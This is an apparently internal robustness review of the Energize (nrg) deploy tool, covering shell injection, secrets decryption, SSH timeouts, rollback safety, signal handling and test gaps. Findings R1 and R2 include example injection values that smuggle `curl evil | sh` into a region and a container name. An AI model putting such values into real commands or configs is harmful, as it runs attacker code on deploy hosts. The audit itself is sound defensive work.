---
title: Robustness Review
nav_order: 99
---

# Robustness Review — Energize (`nrg`)

**Date:** 2026-07-09
**Scope:** Full codebase — Rust core (`src/`), the Rhai standard library
(`lib/*.rhai`), tests (`tests/`, inline `#[cfg(test)]`), CI (`.github/`), and docs.
**Baseline:** the full test suite (`cargo test --all-targets --locked`) passes at
review time.

This document catalogs robustness gaps: places where the tool can lose data,
leave infrastructure in a broken state, execute an unintended command, or pass a
test suite while shipping a real defect. It is a map of where the guarantees stop —
a companion to `docs/safety.md`, which describes where they hold.

## How to read this

Findings are grouped by subsystem and tagged **Critical / High / Medium / Low**.
Severity reflects blast radius × likelihood in a realistic production deploy, not
code aesthetics. Each finding names a concrete failure scenario. A short **Verified**
note means the behavior was confirmed by reading the exact code path (file:line),
not inferred.

The codebase is, on the whole, unusually careful — see
[What is already solid](#what-is-already-solid). Most of the highest-severity items
below are in the **Rhai standard library** (`lib/`), which does the actual deploy
orchestration and has far weaker test coverage than the Rust core.

---

## Summary of highest-priority items

| # | Severity | Area | One line |
|---|----------|------|----------|
| R1 | High | stdlib / registry | ✅ resolved — `region` interpolated unquoted into an ECR login subshell (injection) |
| R2 | High | stdlib / runtime | ✅ resolved — `runtime_exec_cmd(name, command)` interpolated `container_name` unquoted (injection) |
| R3 | High | secrets | ✅ resolved — `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
| R4 | High | engine / sim | probe classifier treats "command not found" as "container absent" |
| R5 | High | engine / ssh | no command timeout or SSH keep-alive — a hung command blocks the deploy (and the lock) forever |
| R6 | High | stdlib / rollback | ✅ resolved — compensation failures are logged-and-continued, so a failed proxy-restore still deletes the serving container |
| R7 | High | engine / signals | ✅ resolved — no SIGINT/SIGTERM handling — Ctrl-C mid-deploy runs zero compensations |
| R8 | High | tests | the live deploy path is never executed; only dry-run plan strings are asserted; `rollback()` has no tests |
| R9 | Medium | engine / ssh | SSH alias pre-resolution drops `Port`/`IdentityFile`/`ProxyJump` from the user's ssh config |
| R10 | Medium | stdlib / deploy | `:latest` default tag silently breaks the rollback chain |
| R29 | High | stdlib / rollback | ✅ resolved — nesting `deploy()` inside a user `transaction()` could resurrect post-committed compensations into a blackhole (found during R6's review; pre-existing, not caused by R6) |

---

## 1. Shell safety in the standard library

The library establishes a strong contract (issue #10): every user-influenced value
spliced into a remote command must be `sh_quote()`'d. Two exported helpers break it.

### R1 — High — `ecr_login` interpolates `region` unquoted into a subshell
`lib/registry.rhai` (~line 83). **Verified.**

The account-auto-detect branch builds:
```rhai
login_cmd += "\"$(aws sts get-caller-identity ...).dkr.ecr." + region + ".amazonaws.com\"";
```
`region` flows from `cfg` and is spliced **raw** inside double quotes, where `$`,
backticks, and `\` stay live (the sibling occurrence on the line above *is*
`sh_quote()`'d — this one was missed). A region like
`us-east-1".amazonaws.com"; curl evil | sh; "` runs arbitrary commands on the host
as the deploy user.
**Fix:** `sh_quote(region)`, or validate the region against `^[a-z0-9-]+$`.

**Resolved (2026-07-10).** `region` is now spliced in as its own `sh_quote()`'d
(single-quoted) segment, adjacent to the surrounding double-quoted segments —
shell concatenates adjacent quoted strings with no separator, and single quotes
keep the region's contents fully literal regardless of `$`, backticks, `;`, or
embedded `"`. Covered by a real end-to-end test that runs the exact constructed
command through a real shell (`local_exec`, live — not dry-run) with a region
crafted to break out of the old unquoted context, and asserts the injected
`touch` never ran (`tests/shell_injection.rs`). Verified by reverting the fix
and confirming the test fails (the marker file IS created) against the
original code.

### R2 — High — `runtime_exec_cmd(container_name, command)` quotes neither argument
`lib/runtime.rhai:146`. **Verified.**

```rhai
fn runtime_exec_cmd(container_name, command) {
    container_cmd() + " exec " + container_name + " " + command
}
```
`docker_exec` in `docker.rhai` quotes the container name; this exported twin does
not. Any caller passing a user-influenced name (`app;curl evil|sh`) gets remote
code execution. `command` is a documented raw escape hatch, but `container_name`
should be quoted.
**Fix:** `sh_quote(container_name)`.

**Resolved (2026-07-10).** `container_name` is now `sh_quote()`'d, matching
`docker_exec`'s existing contract; `command` remains an intentional raw
escape hatch (see R28 below). Covered by the same real-shell-execution test
approach as R1 (`tests/shell_injection.rs`), also verified to fail against
the original code.

### R17 — Low — Caddy admin-API service names are shell-quoted but not URL-encoded
`lib/caddy.rhai` (lines 144, 167, 181, 192). A `service` containing `/` or `../`
(e.g. `x/../../config/admin`) addresses arbitrary Caddy config paths — `proxy_remove`
could `DELETE` unrelated config. Use `url_encode()` (already available) on path
segments.

### R19 — Low — env keys/values written to env-files without newline/`=` validation
`lib/docker.rhai:134`. The comment says "callers must avoid newlines"; nothing
enforces it. A CI-sourced value containing `\n` (a PEM key) injects extra
`KEY=VALUE` lines into the container environment. Validate or reject control chars.

### R28 — Low — documented raw escape hatches
`cfg.extra`, `docker_run_once`'s command, `docker_exec`'s command, and
`pre_deploy_cmd` / `post_deploy_cmd` are interpolated verbatim into remote shell
commands (`docker.rhai`, `deploy.rhai:300`). This is intentional, but the safety
contract silently exempts four fields — a reader who trusts "everything is quoted"
is wrong. Document these prominently as trusted-input-only.

---

## 2. Secrets

### R3 — High — `ENC[...]` tokens are never decrypted at runtime
`src/engine/secret.rs` (`lookup_secret`) vs `src/secrets/mod.rs`. **Verified** —
there is no reference to `ENC[` or `decrypt` anywhere under `src/engine/`.

`nrg secrets encrypt` produces an `ENC[...]` token and the docs (`docs/cli.md`)
tell users to paste it into config or an env file. But `secret("NAME")` reads the
value verbatim from `.env` / `.energize/secrets` and never decrypts it. A user who
follows the documented workflow ships the **raw ciphertext** as the database
password / registry token. The encrypt/seal feature and runtime resolution are only
connected by the operator manually `unseal`-ing first — which is undocumented as a
requirement.
**Fix:** either decrypt `ENC[...]` tokens in `lookup_secret` (locate the key via the
existing `find_key_file`), or document loudly that inline `ENC[...]` in `.env` is
**not** auto-decrypted and only whole-file `seal`/`unseal` is supported.

**Resolved (2026-07-10).** `secret()` now transparently decrypts an `ENC[...]` value
via the discovered `.nrg-key` before it's ever used, throwing a clear error if no key
is found or decryption fails (`src/engine/secret.rs`'s `decrypt_if_needed`). This also
surfaced and fixed a second, related bug: `nrg secrets encrypt`'s `age -a` armored
output is multi-line PEM, which can never survive being pasted into a single
`KEY=VALUE` line — `encrypt_value`/`decrypt_value` (`src/secrets/mod.rs`) now
`|`-join/split the armor so the token is actually single-line-safe, which the
documented "paste into `.env`" workflow requires. Covered end-to-end by
`tests/secrets_age.rs`'s `secret_transparently_decrypts_an_enc_token_pasted_into_env`
(closes the "nothing pins what `secret()` does with a sealed value in `.env`" gap
noted below under "Secrets error paths").

### R24 — Low — full effective config (with revealed secrets) persisted to state
`lib/deploy.rhai:243`. `state_set(service + ".config", to_json(cfg))` writes every
env value — typically revealed secrets — as plaintext JSON into
`.energize/state.json`. `0600` mitigates local exposure, but workspace archiving,
CI artifact upload, or a state backup exfiltrates them. Consider redacting secret
env values from the persisted config, or storing only non-secret keys.

### R8b / secrets CLI — Medium — plaintext on argv
`src/cli/secrets.rs`. `nrg secrets encrypt <value>` and `decrypt <token>` take the
value **on the command line** (visible in `ps` and shell history) — ironic given the
care the exec builtins take to keep passwords off argv. Add a stdin mode
(`--stdin` / read when value omitted).

### unseal writes plaintext without 0600
`src/secrets/mod.rs` (`unseal_file`). The decrypted `.env` is written with the
process umask, not `0600`, and overwrites any existing `.env` without warning. A
locally edited `.env` is silently clobbered, and the plaintext sits world-readable
by default.

### pubkey scraped from stderr without validation
`src/secrets/mod.rs` (`generate_key_pair`). The public key is parsed from
`age-keygen` stderr and `unwrap_or("")` — if the output format drifts, an **empty**
`.nrg-key.pub` is written silently and every later `encrypt` fails cryptically.
Validate the extracted key starts with `age1`.

### R27 — Low — runtime choice leaks across projects
`lib/runtime.rhai`. `set_runtime()` stores into the **persistent global** state
store, so a `podman` choice in one project leaks into a later run of a different
script on the same control machine that never called `set_runtime`. Under dry-run
auto-detect always resolves to `docker`, so the plan can show `docker …` while the
live run issues `podman …`.

---

## 3. SSH execution (`src/engine/runner.rs`, `src/ssh/config.rs`)

### R5 — High — no command timeout, no SSH keep-alive
`RealRunner`. `ssh_command` sets `ConnectTimeout=10` (connect only) but no
`ServerAliveInterval` / `ServerAliveCountMax` and no overall command timeout. A
remote command that hangs after connecting (network partition mid-run, a wedged
`docker pull`, a stuck healthcheck) blocks the calling thread **forever** — and
because a live run holds the advisory state lock for its whole lifetime, it wedges
every future run on that project too.
**Fix:** add `-o ServerAliveInterval=15 -o ServerAliveCountMax=4`, and consider a
wall-clock cap per command.

### R9 — Medium — alias pre-resolution defeats `~/.ssh/config`
`SshConfig::resolve_host` reads only `HostName` and `User`, builds `user@hostname`,
and hands **that** to `ssh`. Because the argument is now a literal address, `ssh`'s
own `Host` block matching never fires, so `Port`, `IdentityFile`, `ProxyJump`,
`ProxyCommand`, `IdentitiesOnly`, etc. from the user's config are **silently
dropped**. An alias defined with `Port 2222` connects on 22.
**Fix:** pass the original alias to `ssh` and let ssh resolve it, or parse and
forward the remaining directives. At minimum, document that only `HostName`/`User`
are honored.

### SSH config parser fidelity — Medium
`src/ssh/config.rs` handles only single-name `Host alias` blocks with exact,
case-sensitive matching. It does **not** support `Host *` wildcards, multi-pattern
lines (`Host web1 web2`), `Match` blocks (explicitly skipped), or `Include`. A user
whose `~/.ssh/config` sets `User deploy` under `Host *` connects as the wrong user.
No test documents the divergence.

### piped() write-before-read can deadlock on large payloads — Medium
`runner.rs` (`piped`). It writes the entire stdin payload, then reads output. For a
small password this is fine (as the comment notes), but `write_remote` of a large
env-file/config while the remote writes >64 KB to stdout can fill the OS pipe buffer
and deadlock both sides. Use a writer thread or `spawn` + concurrent drain for
large payloads.

### Signal-killed process indistinguishable from spawn failure — Low
Exit code `-1` is returned for spawn failure, wait failure, option-injection
rejection, **and** a signal-terminated process (`status.code()` is `None`). Scripts
branching on `exit_code` can't tell these apart. Consider `128 + signal` for the
signal case.

### No connection reuse — Low/Medium
Every builtin call opens a fresh SSH connection. A `wait_healthy` loop reconnects
every 2 s × 30, and a fleet command reconnects per host per call. `ControlMaster` /
`ControlPersist` would cut deploy latency substantially.

---

## 4. Dry-run / live divergence and probes (`src/engine/builtins/sim.rs`)

### R4 — High — probe classifier mistakes a missing CLI for an absent container
`sim.rs:44` (`probe_absent_or_err`). **Verified.**

```rust
if err.contains("no such") || err.contains("not found") { return Ok(false); }
```
The function's own doc comment says a missing CLI (exit 127) "must surface as an
error, never be mistaken for 'not running'." But `docker: command not found`
contains the substring `not found`, so on a host **without** the container runtime,
a live probe returns "container absent" instead of throwing. The deploy then takes
the fresh-install branch against a host where nothing can run, failing confusingly
mid-flight instead of at a clear precondition.
**Fix:** match the runtime's actual absent-object phrasing (`no such object`,
`no such container`, `no such image`) and exclude `command not found` (exit 127).

### R16 — Medium — live port scan assumes `nc`, treats any nonzero as "free"
`sim.rs:111` (`real_port_open`), surfaced via `deploy.rhai:323`. `nc -z ...` exit
!= 0 is read as "port free". On a host without `nc`, **every** candidate looks free
(exit 127), so `pick_port` returns `base+10000` even when a container already binds
it — the deploy dies later with an opaque `docker run -p` bind error inside the
transaction. Also: only localhost-bound listeners are seen, and base ports ≥ 55536
saturate `u16` so all 100 candidates collapse to the same port. Plus a TOCTOU gap
between the scan and `docker run`.

### Fixed 60 s live probe budgets — Medium
`sim_container_healthy` and `sim_wait_port` loop `30 × 2 s` hard-coded. A
slow-booting app (migrations, JIT warmup) fails a deploy spuriously with no knob to
extend it. See also R11 (this budget compounds with the stdlib's own retry loop).

---

## 5. Deploy orchestration & rollback (`lib/deploy.rhai`, `lib/caddy.rhai`)

### R6 — High — rollback blackhole: a failed compensation still deletes the live container
`lib/deploy.rhai` (~360–385) with `src/engine/transaction.rs:70`. **Verified**
(unwind logs and continues on a failed compensation).

During unwind, if the restore-proxy compensation fails (SSH blip, the proxy's health
gate rejecting a degraded old container, or a bogus `old_target` per R10/R4-fallback),
the unwind **continues** to the next compensation and `docker rm -f`'s the new
container — which the proxy is still pointing at. Traffic on that host is blackholed
by the rollback itself.
**Fix:** make the "remove new container" compensation conditional on the proxy
having been successfully restored (guard on the restore result), or order the
compensations so traffic is never pointed at a container that is about to be removed.

**Resolved (2026-07-10).** `deploy_one_host` (`lib/deploy.rhai`) now guards the
rm-new compensation on TWO shared flags: `proxy_switched` (set once the
FORWARD switch to the new container actually happens) and `proxy_restored`
(set only once the restore-proxy compensation's `px_deploy` call returns
*without* throwing). The rm-new compensation skips the removal — with an
operator-facing message explaining why — only when `proxy_switched &&
!proxy_restored`: the proxy was pointed at the new container AND the restore
back genuinely failed. Rhai closures that reference the same outer-scope
variable share the same underlying cell (empirically confirmed against the
real engine, not just assumed from documentation), so a write in one
compensation is visible from the other despite being invoked at different
points during the unwind.

A first version of this fix used a single `proxy_restored` flag and was
caught by an Opus review pass as a regression: rm-new is registered
IMMEDIATELY after the container starts, *before* the health check and the
forward switch — so on a health-check failure (the most common failure mode)
only rm-new is ever registered, `proxy_restored` stays false, and the
single-flag guard would wrongly leave the never-healthy new container running
on every failed deploy (there's no blackhole risk there — the proxy was never
switched away from the still-running old container — so removal is exactly
the pre-R6-fix, correct behavior). The second `proxy_switched` flag narrows
the guard to the genuinely unsafe case.

Covered by three Rust-level unit tests mirroring this exact shape against the
real `transaction()`/`on_rollback()` machinery
(`src/engine/transaction.rs::guarded_compensation_skips_its_destructive_step_when_the_prior_one_fails`,
its happy-path counterpart, and
`guarded_compensation_still_runs_when_the_proxy_was_never_switched` for the
health-check-failure shape) — each "must skip" / "must still run" assertion
was confirmed to fail against the corresponding buggy variant (the fully
unguarded pattern, and separately the single-flag guard) before its guard was
added. As with the rest of the deploy path (R8), this doesn't exercise the
literal `lib/deploy.rhai` file end-to-end in live mode (that would need a
real Docker daemon and a real HTTP health check) — the tests instead mirror
`deploy_one_host`'s exact registration order and guard logic through the real
engine.

### R10 — Medium — `:latest` default tag breaks the rollback chain
`lib/recipe.rhai:34` (`env_or("DEPLOY_TAG", "latest")`) with
`deploy.rhai:170`. **Verified.**

The rollback pointer `<service>.prev` is only written when `prev_image != image`
(a **string** compare). Two `:latest` deploys compare equal, so `.prev` is never
recorded and `rollback()` throws "No rollback image found." Even when it doesn't,
`:latest` on the host has already been overwritten by the broken build, so a
"rollback" re-pulls the same broken image. Default to an immutable tag (git SHA), or
refuse to deploy a mutable `:latest` without an explicit opt-in.

### R4b — Medium — `old_target` fallback uses the container port, not a host port
`deploy.rhai:311`. **Verified.** When no `.target`/`.port` state exists (fresh CI
runner, unshared state), `old_target` falls back to `"localhost:" + container_port`
— the in-container port, not the real host port. A mid-deploy failure then restores
the proxy to `localhost:3000` where nothing listens, then removes the new container:
an outage caused by the rollback.

### R3b — High — `caddy proxy_boot` ignores a failed config write — ✅ resolved
`lib/caddy.rhai:60`. `write_remote(host, base, "/etc/caddy/caddy.json")` needs a
root-writable `/etc` and its result is unchecked; `docker run -d` returns 0
regardless. A non-root deploy user can't write `/etc/caddy`, docker's `-v` then
creates a directory at the path, Caddy crash-loops, but `proxy_boot` reports
success. The failure only surfaces later as opaque curl errors during the traffic
switch — inside the fleet transaction. Check the `write_remote` result.

**Resolved (2026-07-10).** `proxy_boot` now checks `write_remote`'s
`ExecResult` and throws (naming the host and path, with `stderr`) before ever
attempting to start the Caddy container, matching the same
check-and-throw contract used by every other fallible call in the stdlib.
Covered by an in-crate Rust unit test
(`src/engine/eval.rs::caddy_proxy_boot_throws_when_the_config_write_fails`)
that loads the REAL `lib/caddy.rhai` (not a reimplementation) via a
`FakeRunner` configured to fail specifically the config-write command, and
asserts both the thrown message and that `docker run` for Caddy is never
attempted afterward — confirmed to fail (proceeding to start Caddy anyway)
against the original unchecked code before the fix.

### R6b — Medium — post-commit cleanup failures silently swallowed
`deploy.rhai:209`. Rename/stop/remove after commit use `|| true` and unchecked
results, then state is persisted as if cleanup succeeded. If a host drops SSH between
commit and cleanup, the **old** container keeps running under
`--restart unless-stopped` (double capacity, stale code), the new container keeps its
unique name, and the next deploy's rename dance drifts further — with no error ever
surfaced.

### R29 — High — nesting `deploy()` inside a user transaction can resurrect post-committed compensations into a blackhole
`lib/deploy.rhai:214-239` (original, pre-fix line numbers; the guard added
below shifted these down by ~18 lines) with `src/engine/transaction.rs:42-51`.
**Verified** (found by an adversarial red-team pass during R6's review,
reproduced against the real engine with a throwaway script — not yet fixed).

`transaction`/`on_rollback` are ordinary global builtins, so nothing stops a
script from wrapping `deploy()` (or several `deploy()` calls, e.g. for a
multi-service atomic release) in its OWN outer `transaction()`. Per the
documented nesting semantics (`docs/safety.md`, "Nesting"), a **nested**
transaction's compensations are deliberately NOT dropped on success — they
stay on the shared stack so an *enclosing* transaction's later failure can
still unwind them. `deploy()`'s own fleet transaction becomes exactly such a
nested transaction when called this way.

The bug: `deploy()`'s POST-COMMIT phase (renaming the canonical container,
stopping and **removing** the old one, persisting the new port) runs
immediately after its transaction returns `Ok`, treating that `Ok` as
final. When nested, it isn't: the per-host `on_rollback` closures (rm-new /
restore-proxy, including R6's guard flags) registered during that "committed"
transaction are still live. If something ELSE later throws in the *outer*
transaction's body (an unrelated failure — e.g. a second service's deploy
failing in the same multi-service release), the unwind resurrects those
stale closures. The restore-proxy compensation repoints the proxy at
`old_target` — whose container POST-COMMIT already stopped and removed. The
result is the exact blackhole class R6 was written to close, via a different
mechanism (stale-compensation resurrection instead of compensation-failure
continuation). This is a PRE-EXISTING issue, not introduced or worsened by
the R6 fix — the same resurrection would have hit the OLD, unguarded rm-new
compensation identically before R6, with an identical outcome.
**Fix:** either have `deploy()` refuse to run when already inside an active
transaction (assert nesting depth is 0), or fold the post-commit phase INTO
the transaction (register its own compensations / don't treat inner commit
as final), or have post-commit explicitly drop ("cancel") the per-host
compensations it just made moot once it has safely completed their intent.

**Resolved (2026-07-10).** Took the first option: nesting `deploy()` inside a
user transaction isn't a documented or exemplified usage pattern anywhere in
this codebase (checked `docs/*.md` and `lib/examples/`), so refusing it
outright is the safest fix — it removes the hazard entirely rather than
attempting to make post-commit safe under an interaction the rest of the
codebase never anticipated. A new `in_transaction()` builtin
(`src/engine/transaction.rs`, checks the existing nesting-`depth` counter —
already tracked identically in both dry-run and live mode, so this reports
correctly in both) lets `deploy()` (`lib/deploy.rhai`) check, as its very
first statement — before any build/push/pull work — whether it's already
running inside an active transaction, and throw a clear, actionable error
naming R29 if so.

`rollback()` calls `deploy()` internally, so it inherits the same protection
— but an Opus review pass caught that inheriting isn't quite enough:
`rollback()` persists `<service>.prev = <the current image>` as a real side
effect *before* calling `deploy()`, so a nested `rollback()` relying only on
`deploy()`'s check would still have advanced `.prev` to the current image by
the time the throw happened — leaving a caller who read the error and
retried `rollback()` at the top level rolling back to the wrong image.
`rollback()` now carries the identical `in_transaction()` check as its own
first statement too, before that state write. The same review pass also
noted `deploy_one_host` (the per-host worker, called only from inside
`deploy()`'s own transaction) wasn't marked `private fn` and was technically
reachable as `deploy::deploy_one_host(...)`, bypassing the guard — though it
does no post-commit "treat the commit as final" work itself, so this was
informational rather than a real reopening of R29; it's now `private fn`
anyway, for defense-in-depth and consistency with its sibling helpers.

Covered by a Rust-level unit test asserting `in_transaction()` correctly
tracks nesting depth through a transaction and a nested transaction
(`src/engine/transaction.rs::in_transaction_reflects_nesting_depth`), plus
three integration tests (`tests/deploy_behaviors.rs`): one confirming
`deploy()` throws the expected error when nested inside a `transaction()`
(verified to fail without the guard); one confirming a normal, non-nested
`deploy()` call is unaffected by the new check; and one confirming `rollback()`
refuses when nested WITHOUT first mutating `<service>.prev` (a real,
persisted state assertion against `state.json` from a live run — verified to
fail if `rollback()`'s own check is removed, falling through to `deploy()`'s
later check after the state write already happened).

### R13 — Medium — Caddy `PATCH || POST` conflates 404 with any failure
`lib/caddy.rhai:144`. A transient admin-API 400/timeout on `PATCH` triggers the
`POST` branch, which **appends** a duplicate `@id` route at the end of the array
(first match wins → traffic keeps hitting the stale upstream while the tool reports
success). Two domain-less services both become catch-all routes and one swallows the
other. Distinguish 404 from other errors; use PUT-at-id semantics.

### R15 — Medium — no concurrency guard across a deploy
`deploy.rhai` + `sim.rs:246`. Port pick is scan-then-use TOCTOU; the canonical
rename dance and the `.target.<host>` state have no per-service lock. Two
simultaneous deploys of the same service can pick the same "free" port (late bind
failure unwinds a healthy fleet) or interleave renames so `svc-web` / `svc-web-old`
point at the wrong generation and corrupt the next deploy's `old_target`. The
project-level flock serializes *within one control machine* but not across two
operators/CI runners.

### R21 — Low — empty `hosts` array "succeeds" and rewrites rollback state
`deploy.rhai` (~145). An empty host group: `hosts[0]` panics if `pre_deploy` is set;
otherwise the deploy touches no host but still persists new `.version`/`.image`/`.prev`.
State then claims v42 is live and the rollback chain is repointed. Validate `hosts`
is non-empty.

### R10b — Medium — accessories: no readiness check, existing container blocks re-run
`deploy.rhai:463` (`accessory_run`). No `rm -f` before `docker run --name`, so a
stopped-but-present accessory makes every future deploy fail with "name already in
use"; conversely a `run -d` that starts then immediately crashes counts as success
and the app deploys against a dead DB.

### R20 / R25 / R22 / R23 / R26 — Low
- Discarded `post_deploy_cmd` results — a hook that fails on 2/5 hosts reports full
  success (`deploy.rhai:228`).
- Unchecked proxy-image `pull` results (`proxy.rhai:42`, `caddy.rhai:51`).
- `cfg.keep_images` is documented but unused — cleanup only prunes dangling images,
  so tagged old images accumulate until the disk fills (`docker.rhai:256`).
- `recipe.rhai` accesses required keys (`service`, `image_repo`, `web_hosts`,
  registry creds, `db_host`) without existence checks → opaque property errors
  mid-flow; `cfg.network` isn't forwarded to accessories, so the app can't resolve
  the DB on a custom network.
- `attempts <= 0` in `wait_healthy` reads `.status` off an empty map → a
  "property not found" error masks the real health-check failure (`healthcheck.rhai:35`).

---

## 6. Health checks (`lib/healthcheck.rhai`)

### R11 — Medium — double retry loops multiply the timeout by up to 30×
`healthcheck.rhai:64` and `93` wrap `cfg.attempts` retries **around**
`sim_wait_port` / `sim_container_healthy`, which already loop `30 × 2 s`
internally (`sim.rs:345`). So `#{attempts: 5, interval: 1}` — which an operator
reads as a ~5 s bound — actually blocks up to `5 × 60 s = 5 min`, holding the fleet
transaction open the whole time (defaults ≈ 30 min).

### R12 — Medium — single 200 counts as healthy; global 30 s per-request timeout
`healthcheck.rhai:29`. One HTTP 200 passes the gate — no consecutive-success window
— so an app that answers `/up` once during boot then OOMs gets traffic switched to
it (and the Caddy path has no switch-time health gate of its own, unlike
kamal-proxy, so users get 502s). Separately, `http_get`'s timeout is a fixed global
30 s (`http.rs:9`) unrelated to `interval`, so a hanging endpoint makes 30 attempts
take ~16 min.

### R7-health — Medium — health URL assumes the SSH host is an HTTP-reachable name
`deploy.rhai:369` + `healthcheck.rhai`. The probe is an HTTP GET from the **control
machine** to `http://<ssh-host-string>:<ephemeral-port><path>`. With the documented
`web_hosts: ["deploy@web1"]`, the URL becomes `http://deploy@web1:13001/up`
(userinfo in the URL, alias not DNS-resolvable), and on hosts firewalled to 80/443
the ephemeral port is unreachable from the control machine — so a perfectly healthy
container fails health-wait and unwinds the fleet. Health checks should run
**on the host** (over SSH against localhost), not from the control machine.

---

## 7. State, locking, crash safety (`src/engine/state.rs`, `src/cli/exec.rs`)

The state layer is the most robust part of the codebase (atomic fsync'd writes,
unique temp files, corrupt-state fail-loud, future-version refusal, reload-before-write
merge, `0600`). Residual gaps:

### R7 — High — no signal handling; Ctrl-C runs no compensations
`src/main.rs` (absent). There is no SIGINT/SIGTERM handler anywhere. Ctrl-C on a
hanging deploy kills the process mid-transaction: **zero** `on_rollback`
compensations run, the flock is released only by process death, and any state
flushed mid-fleet stays as-is. The operator is left with traffic switched on some
hosts, orphaned `app-web-<ver>` containers, and no automatic unwind. The
transaction docs don't list this as a limit.
**Fix:** install a handler that triggers the compensation unwind (or at minimum
records pending compensations to disk so a follow-up run can complete them), and
document the interrupted-run recovery path.

**Resolved (2026-07-10).** `nrg` now installs a SIGINT/SIGTERM handler once per
`nrg exec`/`nrg run` invocation (`src/engine/interrupt.rs`) that flips a
shared flag, polled by the engine's `on_progress` hook between every
script-level operation (`src/engine/mod.rs`). A set flag ends the running
script with a normal `Err` (`ErrorTerminated`) — the same path a `throw`
takes — so an enclosing `transaction()`'s existing unwind runs every
registered compensation, and the state lock releases via its normal `Drop`,
not because the OS killed the process. The flag is consumed via an atomic
`swap` (not `load`) so the compensations that run during the unwind aren't
themselves immediately re-terminated by the same still-set flag — an actual
bug caught by this fix's own test coverage during development (a naive
`load`-based check silently turned every rollback into a no-op). Documented
in full, including the exact scope, in `docs/safety.md`'s "Ctrl-C
(SIGINT/SIGTERM) triggers the same unwind" section: `on_progress` fires
*between* operations, not *during* one blocking native call, so a
health-check retry loop (bounded `sleep()` per iteration) responds within
about a second, but a single long- or forever-blocking
`ssh_exec`/`local_exec`/`http_get` call can't be preempted mid-flight —
that's the still-open, separate command-timeout gap below. A **second**
signal (which would otherwise be silently swallowed while stuck in exactly
that kind of un-preemptible blocking call, since installing a handler
replaces the default terminate-immediately behavior) exits the process
immediately via `signal_hook::flag::register_conditional_shutdown` — a
force-quit escape hatch, so an operator is never left with no way to kill a
stuck `nrg` short of `SIGKILL`. Covered by a real end-to-end test that sends
an actual SIGINT to a spawned `nrg exec` child process
(`tests/interrupt.rs`) plus a fast unit test simulating the interrupt
without a real signal (`src/engine/mod.rs`).

### Blocking lock wait has no timeout — Medium
`wire_run` calls `lock.write()` which blocks indefinitely. There is no
`--lock-timeout`. Worse, if `root.canonicalize()` in `lock_key` fails, the
re-entrancy key won't match `NRG_STATE_LOCK` and a nested `nrg` self-deadlocks
forever. Add a timeout and fall back gracefully on canonicalize failure.

### Stale `NRG_STATE_LOCK` defeats serialization — Medium
`lock_is_reentrant` trusts the env var. A CI runner that leaks `NRG_STATE_LOCK`
across jobs (same root path) makes a second, genuinely-concurrent deploy skip the
lock and mutate `state.json` concurrently — losing history despite the "serialized"
guarantee. Consider validating the lock is actually held by an ancestor (PID
check), not just that the env var matches.

### `.bak` recovery path is untested — Medium
The `state.json.bak` write is best-effort (`let _ = fs::copy`) and the documented
"restore from backup" recovery has **no test** proving it works. A JSON file that
parses but has the wrong shape (`data` not a map) is also untested.

---

## 8. Tests & CI

### R8 — High — the live deploy path is never executed
`tests/deploy_dryrun.rs`, `deploy_behaviors.rs`, `caddy_proxy.rs`. Every integration
test of the ~1,500-line deploy stdlib runs through `--dry-run` and asserts on plan
**strings**. `FakeRunner` is `#[cfg(test)]`-only and can't be injected into the
spawned `nrg` binary, so the live branches (real `r.ok` handling, `wait_healthy`
loops, post-commit cleanup ordering, the whole rollback unwind) are **never run by
any test**. Combined with the plan-string coupling (tests break on benign wording
changes but prove nothing about live behavior), the stdlib's real risk is untested.
**Fix:** add an `NRG_RUNNER=fake` (or a script-injection) seam so integration tests
can drive live-mode branches against a scripted runner; add a local-sshd or
container-based smoke test for at least one real deploy + rollback.

### R8b — High — `rollback()` has zero tests
`lib/deploy.rhai:407`. The user-facing disaster-recovery entrypoint is exercised by
**no** test — not even a dry-run plan assertion. Only the compensation *registration*
wiring is checked. During an incident is the worst time to discover it errors.

### Real `ssh` / `docker` never exercised — High/Medium
No test spawns a real `ssh` (no sshd fixture) or `docker`. `RealRunner`'s argv
construction, exit-code mapping, and stdin piping against a live sshd are
unverified; an ssh-invocation regression breaks every remote command while the suite
stays green. Only `nrg doctor` checks toolchain presence — and `doctor` itself is
untested (below).

### CLI commands `doctor` / `init` / `tasks` / `ssh` — Medium
Zero tests. `doctor`'s `all_ok` group logic could invert and ship unnoticed; `init`'s
refuse-to-overwrite branch and `nrg ssh`'s option-injection guard are unverified.

### HTTP builtins — Medium
No test ever performs a **successful** HTTP request (no local test server) — only
unreachable-URL failures and dry-run short-circuits. The `http_status_as_error(false)`
behavior the health-check logic depends on, body extraction on 2xx/5xx, and the 30 s
timeout are untested. A `ureq` upgrade that changes any of these would silently break
health checks.

### Secrets error paths & `ENC[...]` runtime resolution — Medium
Only happy-path round-trips are tested. Wrong-key decrypt, malformed armor,
missing/unreadable pubkey, `unseal` overwrite of an existing `.env`, and the
`.gitignore` warning logic are untested. Nothing pins what `secret()` does with a
sealed value in `.env` (see R3).

### Age tests report pass when age is absent — Medium
`tests/secrets_age.rs` returns early (reporting **pass**, not skip) when
`age`/`age-keygen` are missing. If the CI `apt-get install age` step were removed,
the credential pipeline would go untested with a green build. Use a real skip
mechanism, or assert the tests actually ran.

### Flaky patterns — Medium
- `tests/lock_contention.rs` `concurrent_runs_serialize_on_the_state_lock` depends
  on wall-clock timing (spawn A, sleep 400 ms assuming A holds the lock, assert B
  waited ≥ 800 ms). On a loaded CI runner where A takes > 400 ms to reach the lock,
  B wins and the assertion fails. It also has no timeout on `a.wait()` — a lock
  regression hangs CI for hours instead of failing.
- Many unit tests `set_var`/`remove_var` process-global env while cargo runs test
  threads in parallel (`runner.rs` host-key test, `secret.rs`, `exec.rs`
  `NRG_SECRET_LEAK`). This races, and `set_var` concurrent with `getenv` is
  UB-adjacent on glibc. Serialize env-mutating tests or use per-process isolation.

### CI robustness — Medium/Low
- No `cargo fmt --check`.
- No `cargo audit` / `cargo deny` — a secrets-handling deploy tool has no alert for a
  known-vulnerable `ureq`/`rhai`/`fd-lock`.
- Single-OS matrix (`ubuntu-latest`) though errors recommend `brew install age`;
  macOS is never built. `src/cli/ssh.rs` unconditionally imports
  `std::os::unix::process::CommandExt`, so the crate cannot compile on Windows
  despite scattered `#[cfg(not(unix))]` fallbacks.
- No MSRV (`rust-version`) or toolchain pin; with `clippy -D warnings`, any new
  stable can break CI on unrelated PRs.
- No release/tag workflow or published binary — operators build ad-hoc from
  arbitrary commits with no reproducible artifact to roll back to.
- No per-test timeout (no `nextest`) despite blocking/spawning tests.

---

## What is already solid

Worth stating plainly, so the findings above are read in proportion:

